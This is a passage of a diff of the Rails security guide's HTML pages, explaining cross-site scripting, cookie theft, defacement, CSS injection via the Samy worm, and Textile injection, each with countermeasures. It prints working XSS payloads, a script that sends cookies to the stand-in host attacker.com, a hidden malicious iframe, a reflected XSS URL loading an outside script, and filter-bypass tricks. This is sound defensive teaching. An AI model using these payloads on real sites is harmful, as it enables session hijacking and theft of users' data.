2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The Symantec Global Internet Security threat report also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit a SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.</p><h5 id="html-javascript-injection"><a class="anchorlink" href="#html-javascript-injection">7.3.2 HTML/JavaScript Injection</a></h5><p>The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. <em>Escaping user input is essential</em>.</p><p>Here is the most straightforward test to check for XSS:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-0a6e3630223d3909ea34d76af8e70d06">&lt;script&gt;alert('Hello');&lt;/script&gt;
+<textarea class="clipboard-content" id="clipboard-358aca160d386b029b8653f18d36b178">&lt;script&gt;alert('Hello');&lt;/script&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-0a6e3630223d3909ea34d76af8e70d06">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-358aca160d386b029b8653f18d36b178">Copiar</button>
 </div>
 <p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">javascript:alert('Hello')</span><span class="nt">&gt;</span>
 <span class="nt">&lt;table</span> <span class="na">background=</span><span class="s">"javascript:alert('Hello')"</span><span class="nt">&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-ddbb727705b2071b98c6aefe317f6522">&lt;img src=javascript:alert('Hello')&gt;
+<textarea class="clipboard-content" id="clipboard-afd90655fa28376e09ce60259f3f96aa">&lt;img src=javascript:alert('Hello')&gt;
 &lt;table background="javascript:alert('Hello')"&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-ddbb727705b2071b98c6aefe317f6522">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-afd90655fa28376e09ce60259f3f96aa">Copiar</button>
 </div>
 <h6 id="cookie-theft"><a class="anchorlink" href="#cookie-theft">7.3.2.1 Cookie Theft</a></h6><p>These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the <code>document.cookie</code> property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The <code>document.cookie</code> property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-abee7c3b6e23193b38af4368500ae520">&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
+<textarea class="clipboard-content" id="clipboard-1fe1ca915170b9d4e9eb2d8a98000df9">&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-abee7c3b6e23193b38af4368500ae520">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-1fe1ca915170b9d4e9eb2d8a98000df9">Copiar</button>
 </div>
 <p>For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL <a href="http://www.attacker.com/">http://www.attacker.com/</a> plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://www.attacker.com/</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-24ca2e095dc694504bd12c3ef00843e5">&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
+<textarea class="clipboard-content" id="clipboard-1fcbb4f564f6145411afdb546dbe1b3f">&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-24ca2e095dc694504bd12c3ef00843e5">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-1fcbb4f564f6145411afdb546dbe1b3f">Copiar</button>
 </div>
 <p>The log files on <a href="http://www.attacker.com">www.attacker.com</a> will read like this:</p><div class="code_container">
 <pre><code class="highlight plaintext">GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-3136baf14e2ceb5c049d80b91182a1e0">GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+<textarea class="clipboard-content" id="clipboard-d51d98291ca5e0ecae131901f1f2eb62">GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-3136baf14e2ceb5c049d80b91182a1e0">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-d51d98291ca5e0ecae131901f1f2eb62">Copiar</button>
 </div>
-<p>You can mitigate these attacks (in the obvious way) by adding the <strong>httpOnly</strong> flag to cookies, so that <code>document.cookie</code> may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly">will still be visible using Ajax</a>, though.</p><h6 id="defacement"><a class="anchorlink" href="#defacement">7.3.2.2 Defacement</a></h6><p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:</p><div class="code_container">
+<p>You can mitigate these attacks (in the obvious way) by adding the <strong>httpOnly</strong> flag to cookies, so that <code>document.cookie</code> may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly">will still be visible using Ajax</a>, though.</p><h6 id="defacement"><a class="anchorlink" href="#defacement">7.3.2.2 Defacement</a></h6><p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers website to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"StatPage"</span> <span class="na">src=</span><span class="s">"http://58.xx.xxx.xxx"</span> <span class="na">width=</span><span class="s">5</span> <span class="na">height=</span><span class="s">5</span> <span class="na">style=</span><span class="s">"display:none"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-aef9ae340eb8d462130c7abce2f2bded">&lt;iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"&gt;&lt;/iframe&gt;
+<textarea class="clipboard-content" id="clipboard-298bf2db1f6add08639a05419f83282b">&lt;iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"&gt;&lt;/iframe&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-aef9ae340eb8d462130c7abce2f2bded">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-298bf2db1f6add08639a05419f83282b">Copiar</button>
 </div>
-<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This <code>iframe</code> is taken from an actual attack on legitimate Italian sites using the <a href="https://isc.sans.edu/diary/MPack+Analysis/3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p><p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p><p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":</p><div class="code_container">
+<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This <code>iframe</code> is taken from an actual attack on legitimate Italian sites using the <a href="https://isc.sans.edu/diary/MPack+Analysis/3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p><p>A more specialized attack could overlap the entire website or display a login form, which looks the same as the site's original, but transmits the username and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake website.</p><p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":</p><div class="code_container">
 <pre><code class="highlight plaintext">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
   &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b77f0d700bc6196b78fe994b01ceaa91">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
+<textarea class="clipboard-content" id="clipboard-0524cfc1e1860923620e7c8b798cd9c4">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
   &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b77f0d700bc6196b78fe994b01ceaa91">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-0524cfc1e1860923620e7c8b798cd9c4">Copiar</button>
 </div>
 <h6 id="html-javascript-injection-countermeasures"><a class="anchorlink" href="#html-javascript-injection-countermeasures">7.3.2.3 Countermeasures</a></h6><p><em>It is very important to filter malicious input, but it is also important to escape the output of the web application</em>.</p><p>Especially for XSS, it is important to do <em>permitted input filtering instead of restricted</em>. Permitted list filtering states the values allowed as opposed to the values not allowed. Restricted lists are never complete.</p><p>Imagine a restricted list deletes <code>"script"</code> from the user input. Now the attacker injects <code>"&lt;scrscriptipt&gt;"</code>, and after the filter, <code>"&lt;script&gt;"</code> remains. Earlier versions of Rails used a restricted list approach for the <code>strip_tags()</code>, <code>strip_links()</code> and <code>sanitize()</code> method. So this kind of injection was possible:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">strip_tags</span><span class="p">(</span><span class="s2">"some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;"</span><span class="p">)</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-d93b7584d2f98da4fb883033094de121">strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")
+<textarea class="clipboard-content" id="clipboard-d890e8f9eca64beb5d0592d1b4cdcdae">strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-d93b7584d2f98da4fb883033094de121">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-d890e8f9eca64beb5d0592d1b4cdcdae">Copiar</button>
 </div>
 <p>This returned <code>"some&lt;script&gt;alert('hello')&lt;/script&gt;"</code>, which makes an attack work. That's why a permitted list approach is better, using the updated Rails 2 method <code>sanitize()</code>:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">tags</span> <span class="o">=</span> <span class="sx">%w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)</span>
 <span class="n">s</span> <span class="o">=</span> <span class="n">sanitize</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="ss">tags: </span><span class="n">tags</span><span class="p">,</span> <span class="ss">attributes: </span><span class="sx">%w(href title)</span><span class="p">)</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-930e85993d728f927e7c094e9a8054d8">tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+<textarea class="clipboard-content" id="clipboard-38a3f0972e7f94200aa78f6260d05eee">tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, tags: tags, attributes: %w(href title))
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-930e85993d728f927e7c094e9a8054d8">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-38a3f0972e7f94200aa78f6260d05eee">Copiar</button>
 </div>
 <p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p><p>As a second step, <em>it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). <em>Use <code>escapeHTML()</code> (or its alias <code>h()</code>) method</em> to replace the HTML input characters <code>&amp;</code>, <code>"</code>, <code>&lt;</code>, and <code>&gt;</code> by their uninterpreted representations in HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt;</code>, and <code>&amp;gt;</code>).</p><h6 id="obfuscation-and-encoding-injection"><a class="anchorlink" href="#obfuscation-and-encoding-injection">7.3.2.4 Obfuscation and Encoding Injection</a></h6><p>Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:</p><div class="code_container">
-<pre><code class="highlight html"><span class="nt">&lt;IMG</span> <span class="na">SRC=</span><span class="s">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;</span>
+<pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;</span>
   <span class="err">&amp;</span><span class="na">#108</span><span class="err">;&amp;</span><span class="na">#101</span><span class="err">;&amp;</span><span class="na">#114</span><span class="err">;&amp;</span><span class="na">#116</span><span class="err">;&amp;</span><span class="na">#40</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#88</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#41</span><span class="err">;</span><span class="nt">&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-57fa27bd8ea02d0481022ef561b1eeb8">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
+<textarea class="clipboard-content" id="clipboard-0052d178401c0a3759c06cee1e23df6a">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
   &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-57fa27bd8ea02d0481022ef561b1eeb8">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-0052d178401c0a3759c06cee1e23df6a">Copiar</button>
 </div>
-<p>This example pops up a message box. It will be recognized by the above <code>sanitize()</code> filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the <a href="https://hackvertor.co.uk/public">Hackvertor</a>. Rails' <code>sanitize()</code> method does a good job to fend off encoding attacks.</p><h5 id="examples-from-the-underground"><a class="anchorlink" href="#examples-from-the-underground">7.3.3 Examples from the Underground</a></h5><p><em>In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors.</em></p><p>The following is an excerpt from the <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p><div class="code_container">
+<p>This example pops up a message box. It will be recognized by the above <code>sanitize()</code> filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the <a href="https://hackvertor.co.uk/public">Hackvertor</a>. Rails' <code>sanitize()</code> method does a good job to fend off encoding attacks.</p><h5 id="examples-from-the-underground"><a class="anchorlink" href="#examples-from-the-underground">7.3.3 Examples from the Underground</a></h5><p><em>In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors.</em></p><p>The following is an excerpt from the <a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa">Js.Yamanner@m Yahoo! Mail worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'</span>
   <span class="na">target=</span><span class="s">""</span><span class="na">onload=</span><span class="s">"var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
 </span></code></pre>
-<textarea class="clipboard-content" id="clipboard-8e4dd279820d311ab41aa7fbcf3b6516">&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+<textarea class="clipboard-content" id="clipboard-1707f3c3ff248c1db84ba2fb0ee8e7ce">&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-8e4dd279820d311ab41aa7fbcf3b6516">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-1707f3c3ff248c1db84ba2fb0ee8e7ce">Copiar</button>
 </div>
-<p>The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p><p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta's paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p><p>In December 2006, 34,000 actual user names and passwords were stolen in a <a href="https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p><h4 id="css-injection"><a class="anchorlink" href="#css-injection">7.4 CSS Injection</a></h4><div class="info"><p><em>CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.</em></p></div><p>CSS Injection is explained best by the well-known <a href="https://samy.pl/myspace/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.</p><p>MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:</p><div class="code_container">
+<p>The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.</p><p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta's paper</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p><p>In December 2006, 34,000 actual usernames and passwords were stolen in a <a href="https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.</p><h4 id="css-injection"><a class="anchorlink" href="#css-injection">7.4 CSS Injection</a></h4><div class="info"><p><em>CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.</em></p></div><p>CSS Injection is explained best by the well-known <a href="https://samy.pl/myspace/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.</p><p>MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background:url('javascript:alert(1)')"</span><span class="nt">&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-46c56a5c2e21d996fe787218d609887f">&lt;div style="background:url('javascript:alert(1)')"&gt;
+<textarea class="clipboard-content" id="clipboard-b9f7ed3ac582e137b096b89de16ad1b0">&lt;div style="background:url('javascript:alert(1)')"&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-46c56a5c2e21d996fe787218d609887f">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-b9f7ed3ac582e137b096b89de16ad1b0">Copiar</button>
 </div>
 <p>So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy <code>eval()</code> function which executes any string as code.</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('javascript:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-6d4d758b63c5b07a927eba798e5c827e">&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;
+<textarea class="clipboard-content" id="clipboard-b7df35a39d07a17c1f7319c6fea4a866">&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-6d4d758b63c5b07a927eba798e5c827e">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-b7df35a39d07a17c1f7319c6fea4a866">Copiar</button>
 </div>
 <p>The <code>eval()</code> function is a nightmare for restricted list input filters, as it allows the style attribute to hide the word "innerHTML":</p><div class="code_container">
 <pre><code class="highlight js"><span class="nx">alert</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.body.inne</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">rHTML</span><span class="dl">'</span><span class="p">));</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-8d40b7aec621820563e722fa5636e3c1">alert(eval('document.body.inne' + 'rHTML'));
+<textarea class="clipboard-content" id="clipboard-1e62f884f639bd164448ba95efe3ed1d">alert(eval('document.body.inne' + 'rHTML'));
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-8d40b7aec621820563e722fa5636e3c1">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-1e62f884f639bd164448ba95efe3ed1d">Copiar</button>
 </div>
 <p>The next problem was MySpace filtering the word <code>"javascript"</code>, so the author used <code>"java&lt;NEWLINE&gt;script"</code> to get around this:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('java↵script:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-1567d7220baacb1b410c2397b1bb4633">&lt;div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')"&gt;
+<textarea class="clipboard-content" id="clipboard-38751d747fee4a44bc0c41b8de2aa41e">&lt;div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')"&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-1567d7220baacb1b410c2397b1bb4633">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-38751d747fee4a44bc0c41b8de2aa41e">Copiar</button>
 </div>
-<p>Another problem for the worm's author was the <a href="#cross-site-request-forgery-csrf">CSRF security tokens</a>. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.</p><p>In the end, he got a 4 KB worm, which he injected into his profile page.</p><p>The <a href="https://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).</p><h5 id="css-injection-countermeasures"><a class="anchorlink" href="#css-injection-countermeasures">7.4.1 Countermeasures</a></h5><p>This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails' <code>sanitize()</code> method as a model for a permitted CSS filter, if you really need one.</p><h4 id="textile-injection"><a class="anchorlink" href="#textile-injection">7.5 Textile Injection</a></h4><p>If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. <a href="http://redcloth.org/">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to XSS.</p><p>For example, RedCloth translates <code>_test_</code> to <code>&lt;em&gt;test&lt;em&gt;</code>, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the <a href="http://www.redcloth.org">all-new version 4</a> that removed serious bugs. However, even that version has <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some security bugs</a>, so the countermeasures still apply. Here is an example for version 3.0.4:</p><div class="code_container">
+<p>Another problem for the worm's author was the <a href="#cross-site-request-forgery-csrf">CSRF security tokens</a>. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.</p><p>In the end, he got a 4 KB worm, which he injected into his profile page.</p><p>The <a href="https://securiteam.com/securitynews/5LP051FHPE">moz-binding</a> CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).</p><h5 id="css-injection-countermeasures"><a class="anchorlink" href="#css-injection-countermeasures">7.4.1 Countermeasures</a></h5><p>This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. <em>If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application</em>. Use Rails' <code>sanitize()</code> method as a model for a permitted CSS filter, if you really need one.</p><h4 id="textile-injection"><a class="anchorlink" href="#textile-injection">7.5 Textile Injection</a></h4><p>If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. <a href="http://redcloth.org/">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to XSS.</p><p>For example, RedCloth translates <code>_test_</code> to <code>&lt;em&gt;test&lt;em&gt;</code>, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the <a href="http://www.redcloth.org">all-new version 4</a> that removed serious bugs. However, even that version has <a href="https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some security bugs</a>, so the countermeasures still apply. Here is an example for version 3.0.4:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="p">).</span><span class="nf">to_html</span>
 <span class="c1"># =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-099fe7a2c2690651c37b7c3c9db70834">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
